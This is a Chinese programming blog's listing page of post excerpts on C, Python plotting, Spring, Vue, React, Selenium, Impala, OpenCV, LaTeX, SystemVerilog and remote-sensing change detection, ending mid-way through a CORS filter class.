		 #include &lt;stdio.h&gt; int main(int argc, const char * argv[]) { char c; int letters=0,space=0,digit=0,others=0; while((c=getchar())!='#') { if ((c&gt;='a'&amp;&amp;c&lt;='z')||(c&gt;='A'&amp;&amp;c&lt;='Z')) { letters++; } else if(c==' ') { space++; } else if (c&gt;='0'&amp;&amp;c&lt;='9') { digit++; } else { others++; } } printf("letters=%d,space=%d,digit=%d,others=%d\n",letters,space,digit,others); return 0; } output:
123456qwerty \\\\ # letters=6,space=1,digit=6,others=5 Program ended with exit code: 0 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e08eeda0355caf03828220260bddd892/" rel="bookmark">
			python隐秘的角落——笛卡尔之心
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		随着网剧《隐秘的角落》的热播，让法国数学家、哲学家笛卡尔重回大众视野，他的心形线也在剧情中抢尽风头。
在隐秘的角落剧中，少年宫奥数老师张东升，在课上给同学们讲了这么一个故事：
数学家笛卡尔流落到瑞典，邂逅了美丽的公主克里斯蒂娜。国王知道了这件事后，强行拆散了他们。
后来，笛卡尔生病死去，在临死前给公主寄去了最后一封信，信中只有一行字：r=a(1-sinθ)。
同样喜欢数学的公主最终解开了这个秘密——笛卡尔之心。
下边笛卡尔写的！对，就这样子。
好吧，抱歉有点瞎，这个爱情小说不应该看真人！
看这个好了：
为了把这个表示出来，我们试着用python来打印一下这个‘浪漫色彩’的心形。
极坐标方程：ρ=a(1−sinθ)\rho = a (1-\sin\theta)ρ=a(1−sinθ)
也可以是这样：ρ=a(1−sinθ)
这里使用一下MATLIB来给我们打印出来（没版权），或者使用matplotlib打印。
import matplotlib.pyplot as plt import numpy as np Descartes = np.linspace(0.5*np.pi, 1.5*np.pi, 1000) sintheta = np.sin(Descartes) a = 1 y = a * sintheta * (1 - sintheta) x = np.sqrt((1 - sintheta) ** 2 - y ** 2) #x[::-1]步长为-1是反转x x1 = np.hstack((x,-x[::-1])) y1 = np.hstack((y,y[::-1])) plt.plot(x1, y1, c = 'r') plt.show() theta = np.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e08eeda0355caf03828220260bddd892/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9b94fea9add76a17e93f99077719b6f4/" rel="bookmark">
			@Responsebody注解作用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、@responseBody注解的作用是将controller的方法返回的对象通过适当的转换器转换为指定的格式之后，写入到response对象的body区，通常用来返回JSON数据或者是XML数据，需要注意的呢，在使用此注解之后不会再走视图处理器，而是直接将数据写入到输入流中，他的效果等同于通过response对象输出指定格式的数据。
2、
@RequestMapping("/login")
@ResponseBody
public User login(User user){
return user;
}
User字段：userName pwd
那么在前台接收到的数据为：’{“userName”:“xxx”,“pwd”:“xxx”}’
效果等同于如下代码：
@RequestMapping("/login")
public void login(User user, HttpServletResponse response){
response.getWriter.write(JSONObject.fromObject(user).toString());
}
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6dec7d5beacca23cc41ab28dc4cf4008/" rel="bookmark">
			钉钉dd.ready中不能调用方法解决，钉钉微应用遇到的坑
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		钉钉dd.ready中不能调用方法解决 获取微应用免登授权码 官方代码：
dd.ready(function() { dd.runtime.permission.requestAuthCode({ corpId: _config.corpId, // 企业id onSuccess: function (info) { code = info.code // 通过该免登授权码可以获取用户身份 }}); }); code虽然拿到了，但是遇到问题是info.code无法抛出来使用，只能在里面继续访问后台。
其中需要重新定义var axios = require('axios')，不然会报没有定义axios。
例如：
dd.ready(function () { dd.runtime.permission.requestAuthCode({ corpId: 'dingd05db47515f6499cbc961a6cb783455b', // 企业id onSuccess: function (info) { console.log("info.code获取没问题") var axios = require('axios') axios.post('/v1/GetUserDetail', { AppCode: info.code }).then(resp =&gt; { if (resp &amp;&amp; resp.status == 200) { console.log("欢迎" + resp.data.name) }); } }) } }); }); 原因是 在JSAPI官方文档中记录说，dd.ready命名空间中采用异步方式，在页面加载时候就先执行dd.ready命名空间中内容，以至于无法加载到页面中其他方法。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6dec7d5beacca23cc41ab28dc4cf4008/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d1bbe52d7a148b798abb3bfd3c07a632/" rel="bookmark">
			echarts循环图表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		&lt;el-col style="margin-bottom:20px" :span="8" v-for="(item,index) in list" :key="index"&gt; &lt;div class="wrapper" &gt; &lt;div class="roseChart"&gt;&lt;/div&gt; &lt;/div&gt; &lt;/el-col&gt; // 遍历饼图 drawRose(){ var echarts = require("echarts"); var roseCharts = document.getElementsByClassName('roseChart'); // 对应地使用ByClassName for(var i = 0;i &lt; roseCharts.length;i++ ){ // 通过for循环，在相同class的dom内绘制元素 var myChart = echarts.init(roseCharts[i]); myChart.setOption({ color: ['#546ef3', '#a6cb09', '#f8bd00'], legend: { x: 'left', textStyle: { color: '#fft' } }, tooltip: { show: true, trigger: 'item', // formatter: "{b} : &lt;br/&gt;{d}%", formatter: "{b} : &lt;br/&gt;{c}"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d1bbe52d7a148b798abb3bfd3c07a632/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/767f9ed1fbe89aec5594e8abfc9b5451/" rel="bookmark">
			selenium常见元素操作之窗口切换--iframe
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		selenium常见元素操作之窗口切换--iframe 方式一:方式二: from selenium import webdriver from selenium.webdriver.support.wait import WebDriverWait from selenium.webdriver.support import expected_conditions as EC from selenium.webdriver.common.by import By driver = webdriver.Chrome()
#切换到frame下
#1.确认你要操作的元素在iframe里面，采取切换
#2.确认iframe特征有几个，有什么属性
#3.等待iframe是可用的
方式一: #4.切换操作 ：iframe的下标/iframe的name属性/iframe的webelement属性
driver.switch_to.frame(4)
driver.switch_to.frame(“login_frame_qq”)
driver.switch_to.frame(driver.find_element_by_xpath(’//iframe[@name=“login_frame_qq”]’))
方式二: WebDriverWait(driver,20).until(EC.frame_to_be_available_and_switch_to_it(“login_frame_qq”))
#5.进入iframe里面的html页面，主页面了
#查找元素，操作元素
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/102da2613fcf9e2ea12e63106bba30d2/" rel="bookmark">
			C语言中exit()、_Exit()、_exit()、return区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		函数介绍 #include &lt;unistd.h&gt; void _exit(int status); #include &lt;stdlib.h&gt; void exit(int status); void _Exit(int status); 区别 首先是头文件不同，使用不同的头文件是因为exit()、_Exit()是由ISO C说明的，_exit()是由POSIX.1说明的。
其中exit()、_Exit()、_exit()表示进程结束，return是语言级别的，它表示了调用堆栈的返回，如果返回的是main函数，则为退出程序。其中_Exit()、_exit()立即进入内核，_Exit()是对_exit()的封装。而exit()执行一些返回程序后再返回内核。
exit()：　清理I/O缓冲区后再退出进程_exit()：　直接结束进程进入到内核中_Exit()：　直接结束进程进入到内核中return：　函数返回 例子 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; int main() { int ret = 0; printf("This is first line\n");//加\n是为了将缓冲区写出 printf("This is second line!"); exit(0); } //执行输出： //This is first line //This is second line! #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; int main() { int ret = 0; printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/102da2613fcf9e2ea12e63106bba30d2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8d78f82e25cc86eb4e103462b8bc522d/" rel="bookmark">
			收藏 | C语言最全入门笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C语言一经出现就以其功能丰富、表达能力强、灵活方便、应用面广等特点迅速在全世界普及和推广。C语言不但执行效率高而且可移植性好，可以用来开发应用软件、驱动、操作系统等。C语言也是其它众多高级语言的鼻祖语言，所以说学习C语言是进入编程世界的必修课。
hello,world #include&lt;stdio.h&gt; int main() { /*在双引号中间输入Hello World*/ printf("Hello World"); return 0; } 注：在最新的C标准中，main函数前的类型为int而不是void
c语言的具体结构 简单来说，一个C程序就是由若干头文件和函数组成。
#include &lt;stdio.h&gt;就是一条预处理命令, 它的作用是通知C语言编译系统在对C程序进行正式编译之前需做一些预处理工作。
函数就是实现代码逻辑的一个小的单元。
必不可少之主函数 一个C程序有且只有一个主函数，即main函数。
C程序就是执行主函数里的代码，也可以说这个主函数就是C语言中的唯一入口。而main前面的int就是主函数的类型；printf()是格式输出函数，这里就记住它的功能就是在屏幕上输出指定的信息；return是函数的返回值，根据函数类型的不同，返回的值也是不同的；\n是转义字符中的换行符。(注意：C程序一定是从主函数开始执行的)
良好习惯之规范 1.一个说明或一个语句占一行，例如：包含头文件、一个可执行语句结束都需要换行。
2.函数体内的语句要有明显缩进，通常以按一下Tab键为一个缩进。
3.括号要成对写，如要删除的话也要成对删除。
4.当一句可执行语句结束的时候末尾需要有分号。
5.代码中所有符号均为英文半角符号。
程序解释——注释
注释是写给程序员看的，不是写给电脑看的。
C语言注释方法有两种：
多行注释： /* 注释内容 */
单行注释： //注释一行
有名有姓的C(标识符) C语言规定，标识符可以是字母(A～Z，a～z)、数字(0～9)、下划线_组成的字符串，并且第一个字符必须是字母或下划线。在使用标识符时还有注意以下几点：
1.标识符的长度最好不要超过8位，因为在某些版本的C中规定标识符前8位有效，当两个标识符前8位相同时，则被认为是同一个标识符。
2.标识符是严格区分大小写的。例如Imooc和imooc 是两个不同的标识符。
3.标识符最好选择有意义的英文单词组成做到"见名知意"，不要使用中文。
4.标识符不能是C语言的关键字。想了解更多C语言关键字的知识。
变量及赋值 变量就是可以变化的量，而每个变量都会有一个名字（标识符）。变量占据内存中一定的存储单元。使用变量之前必须先定义变量，要区分变量名和变量值是两个不同的概念。
变量定义的一般形式为：数据类型 变量名;
多个类型相同的变量：数据类型 变量名, 变量名, 变量名...;
注意:在定义中不允许连续赋值，如int a=b=c=5;是不合法的。
变量的赋值分为两种方式:
先声明再赋值
声明的同时赋值
基本数据类型 C语言中，数据类型可分为：
基本数据类型
构造数据类型
指针类型
空类型四大类
最常用的整型, 实型与字符型(char,int,float,double):
整型数据是指不带小数的数字(int,short int,long int, unsigned int, unsigned short int,unsigned long int):
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8d78f82e25cc86eb4e103462b8bc522d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/245cd4fa5b6011ea9467d7aaae507535/" rel="bookmark">
			大数据平台CDH和Impala的使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、CDH的介绍二、Impala概念2.1 什么是Impala2.2 Impala的优缺点2.3 Impala的架构 2.4 Impala的数据类型三、Impala 操作命令3.1 Impala的外部shell3.2 Impala的内部shell 四、DDL数据定义4.1 数据库操作4.2 表操作 五、DML数据操作六、查询七、存储和压缩八、优化 一、CDH的介绍 Cloudera版本（Cloudera’s Distribution Including Apache Hadoop，简称CDH），基于Web的用户界面,支持大多数Hadoop组件，包括HDFS、MapReduce、Hive、Pig、 HBase、Zookeeper、Sqoop，简化了大数据平台的安装、使用难度。
Cloudera Manager的功能：
管理：对集群进行管理，如添加、删除节点等操作。监控：监控集群的健康情况，对设置的各种指标和系统运行情况进行全面监控。诊断：对集群出现的问题进行诊断，对出现的问题给出建议解决方案。集成：多组件进行整合。 Cloudera Manager的架构：
Server：负责软件安装、配置，启动和停止服务，管理服务运行的群集。Agent：安装在每台主机上。负责启动和停止的过程，配置，监控主机。Management Service：由一组执行各种监控，警报和报告功能角色的服务。Database：存储配置和监视信息。Cloudera Repository：软件由Cloudera管理分布存储库。（类似Maven的中心仓库）Clients：是用于与服务器进行交互的接口（API和Admin Console） 集群添加服务：
查看主机状况：
虽然状态全红，但是内存、CPU的状态都较好，并不影响服务的使用。
二、Impala概念 2.1 什么是Impala Cloudera公司推出，提供对HDFS、HBase数据的高性能、低延迟的交互式SQL查询功能。基于Hive，使用内存计算，兼顾数据仓库、具有实时、批处理、多并发等优点。是CDH平台首选的PB级大数据实时查询分析引擎。
2.2 Impala的优缺点 优点：
基于内存运算，不需要把中间结果写入磁盘，省掉了大量的I/O开销无需转换为MapReduce，直接访问存储在HDFS，HBase中的数据进行作业调度，速度快使用了支持Data locality的I/O调度机制，尽可能地将数据和计算分配在同一台机器上进行，减少了网络开销支持各种文件格式，如TEXTFILE 、SEQUENCEFILE、RCFile、Parquet可以访问Hive的metastore，对Hive数据直接做数据分析 缺点：
对内存的依赖大，且完全依赖于Hive实践中，分区超过1万，性能严重下降只能读取文本文件，而不能直接读取自定义二进制文件每当新的记录/文件被添加到HDFS中的数据目录时，该表需要被刷新 2.3 Impala的架构 从上图可以看出，Impala自身包含三个模块：Impalad、Statestore和Catalog，除此之外它还依赖Hive Metastore和HDFS。
Impalad：接收client的请求、Query执行并返回给中心协调节点；子节点上的守护进程，负责向Statestore保持通信，汇报工作。
Catalog：分发表的元数据信息到各个impalad中，接收来自Statestore的所有请求。
Statestore：负责收集分布在集群中各个impalad进程的资源信息、各节点健康状况，同步节点信息；负责query的协调调度。
2.4 Impala的数据类型 Hive数据类型Impala数据类型长度TINYINTTINYINT1byte有符号整数SMALINTSMALINT2byte有符号整数INTINT4byte有符号整数BIGINTBIGINT8byte有符号整数BOOLEANBOOLEAN布尔类型，true或者falseFLOATFLOAT单精度浮点数DOUBLEDOUBLE双精度浮点数STRINGSTRING字符系列。可以指定字符集。可以使用单引号或者双引号。TIMESTAMPTIMESTAMP时间类型BINARY不支持字节数组 注意：Impala虽然支持Array，Map，Struct复杂数据类型，但是支持并不完全，一般处理方法，将复杂类型转化为基本类型，通过Hive创建表。
三、Impala 操作命令 3.1 Impala的外部shell 选项描述-h, --help显示帮助信息-v or --version显示版本信息-i hostname, --impalad=hostname指定连接运行 impalad 守护进程的主机。默认端口是 21000。-q query, --query=query从命令行中传递一个shell 命令。执行完这一语句后 shell 会立即退出。-f query_file, --query_file= query_file传递一个文件中的 SQL 查询。文件内容必须以分号分隔-o filename or --output_file filename保存所有查询结果到指定的文件。通常用于保存在命令行使用 -q 选项执行单个查询时的查询结果。-c查询执行失败时继续执行-d default_db or --database=default_db指定启动后使用的数据库，与建立连接后使用use语句选择数据库作用相同，如果没有指定，那么使用default数据库-r or --refresh_after_connect建立连接后刷新 Impala 元数据-p, --show_profiles对 shell 中执行的每一个查询，显示其查询执行计划-B（–delimited）去格式化输出–output_delimiter=character指定分隔符–print_header打印列名 ①连接指定hadoop101的impala主机
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/245cd4fa5b6011ea9467d7aaae507535/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f2cba1404c208c6c8bd51a531daf523d/" rel="bookmark">
			vue 中后台权限设计
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		权限控制是中后台系统常见的需求，一般指根据系统设置的安全规则或者安全策略，用户可以访问而且只能访问自己被授权的资源。
以下demo的做法是将菜单和路由结合起来，并接受后端传回的用户权限信息，通过对路由管理来做权限的校验，对于没有通过权限校验的用户进行提示或者跳转到相应的页面。
获取当前用户的权限：
export function getCurrentAuth() { // 接口请求数据 return [“admin”]; // 模拟后台返回的用户权限 } 验证路由定义的权限是否在当前用户权限中：
export function check(auth) { const current = getCurrentAuth(); return current.some(item =&gt; auth.includes(item)); } 判断用户是否登录：
export function isLogin() { const current = getCurrentAuth(); return current $$ current !== ‘guest’; } 在路由守卫中做判断，根据路由设定的权限，判断用户是否有访问权限：
Import Vue from “vue” import findLast form “lodash/findLast ” import NProgress form “nprogress ” // 页面跳转进度条组件 import Layout from '@/layout' import Router form “vue-router ” Import {check, isLogin} from “/utils/auth” Vue.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f2cba1404c208c6c8bd51a531daf523d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/64f03365b2ee525f9ac50fbed0e2beb4/" rel="bookmark">
			GW-白平衡美白算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		#include&lt;opencv2/opencv.hpp&gt; using namespace cv; using namespace std; cv::Mat GW(const cv::Mat srcImage) { int beta;//美白系数 cv::Mat dstImage; vector&lt;cv::Mat&gt; Channels; cv::split(srcImage, Channels); cv::Mat B = Channels[0]; cv::Mat G = Channels[1]; cv::Mat R = Channels[2]; double Baver = cv::mean(B)[0];	double Gaver = cv::mean(G)[0];	double Raver = cv::mean(R)[0]; beta = 2; double K = (Baver + Gaver + Raver) / beta; //计算增益系数	double Kb, Kg, Kr; Kb = K / Baver;	Kg = K / Gaver;	Kr = K / Raver; //白平衡处理后的通道	cv::Mat dstB, dstG, dstR; dstB = B * Kb;	dstG = G * Kg;	dstR = R * Kr; cout &lt;&lt; cv::mean(dstB)[0] &lt;&lt; "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/64f03365b2ee525f9ac50fbed0e2beb4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2b2233b935e8b7c6f02293303fbffc6e/" rel="bookmark">
			VS Code 与texlive真乃天作之合
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 为什么选择这个环境卸载ctex安装texlivevscode快捷键vscode必要的插件修改vscode配置文件如何进行调试实用功能参考文献管理辅助工具参考文献 为什么选择这个环境 之前一直用的是ctex+winedt环境，不过ctex已经很久没有维护了，在编译某些代码的时候，比如\eqref{10.11}显示的是(???)，并且不知道为什么页码编译也错误。原来编译模版频频出错的原因是，CTeX 套装已经很久没有更新了，使用的是较低版本的 MiKTeX，现在已经无法在线更新宏包和 TeX 引擎。而且，划重点了~~~MikTeX 只安装必要包，其他需要在用户使用的时候再安装需要的包;但是，TeX Live 在安装时默认安装所有的包。所以相对我们这些小白用户而言，使用TeX Live可以省去选择时的犹豫，而且一劳永逸。在cjd老师的建议下，我决定使用texlive。
关于winedt的话，虽然我已经用的很顺手了，不过所有种类的代码只用一个IDE的话，我更偏向于VSCODE。
卸载ctex 之前用的是miktex2.9，直接在windows上卸载即可
Ctex出坑Texlive入坑建议不要两者都安装。
安装texlive 下载texlive镜像地址参考TeX Live安装指南
对于其中iso文件的具体操作步骤请见TeX Live安装教程，这里面没有用镜像估计很慢，并且给出了TeXstudio这个ide的安装地址。
第一次安装预留了3.7GB，发现没有安装下，参考使用VSCode编写LaTeX，应该点击advanced选项，取消勾选掉不必要的包。
vscode快捷键 打开键盘快捷方式面板(左下侧齿轮，或快捷键ctrl+k,ctrl+s)搜索"切换侧栏可见性"，设置快捷键为ctrl+k ctrl+b。搜索 latex build，将默认的ctrl+alt+b替换为ctrl+b(与Sublime Text 3统一)。搜索latex recipe，设置快捷键为ctlr+r，方便点菜(选择编译方式)！(ST3中是显示文档大纲)。 其他常用的快捷键： ctrl+k ctrl+a： 切换活动栏可见性(左侧图标开关)ctrl+alt+x：显示LaTeX面板(左侧编译命令面板和文档大纲)。ctrl+alt+c：清除辅助文件ctrl+alt+v：查看编译的pdf文件(预览)ctrl+alt+j：正向搜索。当设置"latex-workshop.view.pdf.viewer": “tab”;时，在LaTeX源文件中按下快捷键，定位到PDF文档相应位置。(反向搜索见后面) vscode必要的插件 latex workshop LaTex Workshop 是 VSCode 的插件，这个插件为 VS Code 提供了 LaTeX 语言支持。 LaTeX Language Support 这个插件为VS Code提供了LaTeX语言支持 TODO Highlight 论文某一部分写不下去了，加个% TODO:，留着下次写 Dracula Official 一款不错的黑色主题 GitLens &amp; Git History 图形化的版本控制器 latex-formatter
对于代码进行缩进，使用方法是shift +alt+F或者鼠标右键，格式化文档（爽）Settings Sync
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2b2233b935e8b7c6f02293303fbffc6e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/38d733e9fcefa7dd55c16528d787b6a0/" rel="bookmark">
			Unity 工具之 UniWebView 内嵌网页/浏览器到应用中，并且根据UGUI大小放置（简单适配UGUI）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Unity 工具之 UniWebView 内嵌网页/浏览器到应用中，并且根据UGUI大小放置（简单适配UGUI） 目录
Unity 工具之 UniWebView 内嵌网页/浏览器到应用中，并且根据UGUI大小放置（简单适配UGUI）
一、简单介绍
二、UniWebView 组件上的几个参数属性选项介绍
三、一些关键接口介绍
四、Transition
五、Memory Management（内存管理）
六、Messaging System
七、注意实现
八、效果预览
九、实现 通过UGUI控制 WebView 大小的使用的具体步骤
十、关键代码
十一、参考工程
一、简单介绍 Unity 工具类，自己整理的一些游戏开发可能用到的模块，单独独立使用，方便游戏开发。
本节介绍，使用 UniWebView 内嵌网页/浏览器到应用中，并通过 UGUI 控制 Web View 大小显示的方法。方法不唯一，这里仅供参考。
UniWebView 包含一组 C# 的高层级 API，它对 iOS 和 Android 平台的本机 API 进行了抽象封装。使用 UniWebView，您可以在无需了解本机开发的任何内容的情况下，就将浏览器行为添加到游戏中。当您需要显示活动公告及通知，或为玩家排名添加排行板，或是向用户显示任何网页内容时，UniWebView 都可以帮助您轻松解决问题。
UniWebView 支持 在iOS 9.0 或更高版本，以及 Android 5.0 (API Level 21) 或更高版本。它还包含在 macOS 上的 Unity Editor 的完整功能支持。
功能：
网络浏览
载入本地 HTML 文件
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/38d733e9fcefa7dd55c16528d787b6a0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f688b5076e54eb88dddeb02db39d6f58/" rel="bookmark">
			React 组件的拆分
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		新建组件 在src目录下，新建一个文件，这里就叫做XiaojiejieItem.js，然后先把最基础的结构写好（这里最好练习一下上节课学习的快捷键）。
import React, { Component } from 'react'; //imrc class XiaojiejieItem extends Component { //cc render() { return ( &lt;div&gt;小姐姐&lt;/div&gt; ); } } export default XiaojiejieItem; 写好这些代码后，就可以到以前写的Xiaojiejie.js文件中用import进行引入，代码如下:
import XiaojiejieItem from "./xiaojiejieItem" 修改Xiaojiejie组件 已经引入了新写的组件，这时候原来的代码要如何修改才能把新组件加入？
把原来的代码注释掉，当然你也可以删除掉，我这里就注释掉了,注释方法如下:
// &lt;li key={index+item} onClick={this.deletItem.bind(this,index)} // dangerouslySetInnerHTML={{__html:item}} // &gt; // &lt;/li&gt; 最后直接写入Xiaojiejie标签就可以了. &lt;XiaojiejieItem /&gt; 这时候可以预览一下效果，虽然现在已经把组件进行了拆分，但是还全是显示的小姐姐，还没有实现传值，下节课我们主要实现一下React组件之间的传值（父组件向子组件传递数据）。
技术胖第一博客网站：https://jspang.com/detailed?id=46#toc220
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/faf3420dd35588fa67b4af47adaef33a/" rel="bookmark">
			变化检测算法合集
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1.变化检测的概念 变化检测是从不同时期的遥感数据中定量分析和确定地表变化的特征与过程；
遥感变化检测是一个确定和评价各种地表现象随时间发生变化的过程；
遥感变化检测是遥感瞬时视场中地表特征随时间发生的变化引起两个时期影像像元光谱响应的变化。
2.变化检测的应用 民用：主要用于资源和环境监测中的土地利用和覆盖变化、森林和植被变化、城市扩展等变化信息获取；
测绘：地理空间数据更新；
自然灾害：地震、洪水、泥石流和森林大火等灾情监测与评估。
军事：应用于毁伤效果评估、战场信息动态感知、军事目标和兵力部署监测等方面。
3.变化检测的主要内容 它涉及到变化的类型、分布状况及变化信息的描述，即需要确定变化前后的地物类型、界限和分析变化的属性：
1）判断是否发生了变化；
2）确定发生变化的区域；
3）鉴别变化的性质；
4）评估变化的时间和空间分布模式。
其中前两个方面是变化检测所要达到的基本目标，因而也是变化检测研究中需要首先解决的问题，狭义上的变化检测概念即是由这两方面构成。
4.遥感影像变化检测处理流程 1）预处理
包括几何校正、几何配准、辐射校正、图像滤波、图像增强
在理想状态下，变化检测过程中采用的数据要求用相同传感器来获得，并且它们在记录时具有相同的空间分辨率、相同的拍摄几何特征、相同的光谱波段、相同的辐射分辨率，而且在一天的同一个时间拍摄。
不同图像数据的空间配准精度也是进行有效变化检测的必备条件，通过配准后的精度需要在1/4~1/2个像素之内
2）变化区域检测
各种花式CNN网络
3）后处理
由于受噪声的影响，经过决策判别后的分类结果中会包含许多虚警，后处理阶段对分类的结果进行处理，滤除部分虚警，剔除其中不感兴趣的变化，以满足实际需求。
主要方法包括滤波处理、区域生长法、数学形态学处理等
4）性能评价
（1）变化检测性能评估可以通过计算虚警数、漏检像素数和总的误差像素数来定量分析；
（2）评估变化检测方法性能的另一个重要方面是变化阈值的自动化水平及有效性
5.变化检测算法从检测层次上分类 1. 像素级：对两幅图像对应像元灰度值进行计算处理来检测变化。
优点：保留了尽可能多的原始信息，具有其他层次上所不具备的细节信息
缺点：效率低下；未考虑空间等特征属性变化；抗干扰能力差（太阳照射角、地表湿度等自然因素）
2. 特征级：采用一定的算法先从原始图像中提取特征信息（边缘、形状、轮廓、纹理），然后对这些特征信息进行综合分析与变化检测
优点： 运行效率较高；对特征属性的判断具有更高的可信度和准确性；从一定程度上减少了外界因素对结果的干扰
缺点： 在特征提取过程中会出现信息的部分丢失，难以提供细微信息；依赖于特征提取的结果，但特征提取本身比较困难
3. 目标级：主要检测某些特定对象（比如道路、房屋等具有明确含义的目标），是在图像理解和图像识别的基础上进行的变化检测，它是一种基于目标模型的高层分析方法
优点：它接近用户的需求，检测的结果可直接应用
缺点：目标提取具有一定困难
6.变化区域检测算法从算法实现原理分类 持续更新。。。
整理不易，谢谢点赞关注！ 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d1f52c5a717c0449141757b8cb19dfa8/" rel="bookmark">
			SV-函数（function）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		function：
1）可以在参数列表中指定输入参数（input）、输出参数（output）、输入输出参数（inout）、引用参数（ref）。
2）可以返回数值或者不返回数值（void）
function int double (input a); return 2*a; endfunction initial begin $display ("double of %0d is %0d",10,double(10)); end 3）function默认数据类型为logic，例如：input [7:0] addr。
4）数组可以作为形式参数传递。
5）function可以返回结果也可以不返回，若返回需要用关键词return，若不返回则应该在声明function时采用void function（）。
6）只有数据变量可以在形式参数列表中被声明为ref类型，而线网类型不可以。
7）在使用ref时，有时候为了保护数据对象只被读取不被写入，可以通过const的方式限定ref声明的参数。
8）在声明参数时，可以给默认值，例如input[7：0] addr = 0，同时在调用时如果省略该参数的传递，那么默认值即会被传递给function
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/064657a13e6495cfa98aec1f982426fa/" rel="bookmark">
			SV过程块（always、initial）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		module，interface认为是硬件；program，class认为是软件
过程块：1）always（可综合）
2）initial（不可综合)
always:
可用于module和interface中
always @ （posedge clk）----时序逻辑 " &lt;= "
always @ （ * ）----组合逻辑 " = "
eg:上文提到了always具备描述硬件电路行为和核心要素，你认为下列选项哪些是正确使用always的方式？
A. 由时钟驱动 B. 由其他非时钟信号驱动 C. 不同always语句块之间是并行执行的 D. 可以在always中初始化变量
答案：A B C
解析：由时钟驱动就是时序逻辑，由其他非时钟信号驱动就是组合逻辑，所以AB对。
always是并行执行，C对。可以对变量进行复位（rst_n），而不能初始化。D错
initial:（多用于testbench）
initial非常符合软件的执行方式，即只执行一次。
initial和always一样，无法被延迟执行，即在仿真一开始它们都会同时执行，执行时没有先后顺序之分。
initial内部是按时间顺序进行的。
eg: initial begin rst_n = 0 //先复位 #201 rst_n = 1 //延时201ns，复位结束 #2000 a = 1; b = 1; #20 a = 0; b = 0; #200 $stop; end initial过程块可以用在module、interface和program中。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/57ad1625e54b72ea8b0eb62cd3b76d9d/" rel="bookmark">
			Latex 乘号 分号
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Latex 乘号 分号 \frac{}{}:分号 \times: 乘号 举例：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/71fd0864b2a2f7a7c30268579c6f636e/" rel="bookmark">
			SSM框架跨域的解决（ajax跨域）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、跨域的工具类
package com.ssm.util;
import java.io.IOException;
import javax.servlet.Filter;
